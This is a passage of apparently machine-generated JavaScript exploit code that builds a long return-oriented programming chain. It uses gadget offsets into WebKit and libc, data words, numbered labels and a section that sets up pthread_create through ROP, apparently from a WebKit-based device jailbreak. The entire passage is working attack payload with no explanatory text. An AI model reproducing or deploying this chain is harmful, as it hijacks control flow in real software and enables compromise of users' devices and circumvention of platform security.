webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145992, //L2050
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146008, //L2051
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2050:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2051:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2052:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2053:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146144, //L2055
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146128, //L2054
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2054:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2055:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2056:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2057:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+146344, //L2060
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146312, //L2058
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2058:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2059:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146448, //L2062
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146432, //L2061
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2061:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2062:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146560, //L2065
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146528, //L2063
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2063:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2064:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146624, //L2066
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L2066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+146680, //L2068
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2068:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+146824, //L2071
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+146840, //L2072
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+146808, //L2070
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2070:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2071:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2072:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+147000, //L2076
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146952, //L2073
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146968, //L2074
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2073:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2074:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2075:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2076:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+147128, //L2078
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147144, //L2079
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+147112, //L2077
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2077:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2078:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147240, //L2080
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147256, //L2081
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2080:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2081:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147368, //L2082
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147352, //L2083
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2083:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2082:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+147456, //L2085
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+147440, //L2084
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2084:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147552, //L2086
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147568, //L2087
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2086:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147680, //L2088
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147664, //L2089
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2089:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2088:
db([0, 0]); // 0x0
//_pthread_create__rop:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147752, //L2090
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2090:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147816, //L2092
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2092:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147920, //L2095
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147968, //L2097
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2095:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2094:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2096:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2097:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+148064, //L2099
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+148048, //L2098
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2098:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2099:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2100:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2101:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2102:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2103:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2105:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+148376, //L2106
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2106:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2108:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2110:
db([2, 0]); // 0x2
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+148568, //L2111
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2111:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+148680, //L2113
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2113:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2114:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L2115:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+148808, //L2117
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+148792, //L2116
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2116:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2118:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2120:
ropchain+148960, //L2119
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+158952, //L2121
//L2119:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+149056, //L2123
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2123:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+149112, //L2124
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2124:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2126:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L2127:
db([65536, 0]); // 0x10000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+149264, //L2129
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2129:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+149320, //L2130
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2130:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+149408, //L2133
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2132:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2136:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L2137:
db([312, 0]); // 0x138
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2138:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+149592, //L2140
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+149608, //L2141
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2140:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+149760, //L2144
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+149792, //L2146
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+149744, //L2143
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+149776, //L2145
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2143:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2144:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2145:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2146:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+149888, //L2148
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+149872, //L2147
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2147:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2148:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2149:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2150:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+150104, //L2152
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150120, //L2153
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150088, //L2151
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2151:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2152:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2153:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150208, //L2154
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+150240, //L2156
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2154:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2155:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2156:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2158:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+150368, //L2160
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150384, //L2161
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2160:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2161:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+150536, //L2164
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150568, //L2166
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+150520, //L2163
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150552, //L2165
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2163:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2164:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2165:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2166:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150664, //L2168
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+150648, //L2167
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2167:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2168:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2170:
db([15, 0]); // 0xf
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+150776, //L2171
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2171:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+150920, //L2174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150936, //L2175
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150904, //L2173
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2173:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2174:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2175:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151024, //L2176
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151056, //L2178
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2176:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2177:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2180:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+151184, //L2182
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151200, //L2183
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2182:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2183:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+151352, //L2186
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+151384, //L2188
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+151336, //L2185
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151368, //L2187
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2185:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2186:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2187:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2188:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151480, //L2190
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151464, //L2189
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2189:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2190:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2191:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2192:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+151696, //L2194
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+151712, //L2195
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151680, //L2193
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2193:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2194:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2195:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151800, //L2196
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151832, //L2198
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2196:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2197:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2198:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2200:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2201:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+151976, //L2203
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151992, //L2204
webkit_base+7438103, //mov [rsi], rax
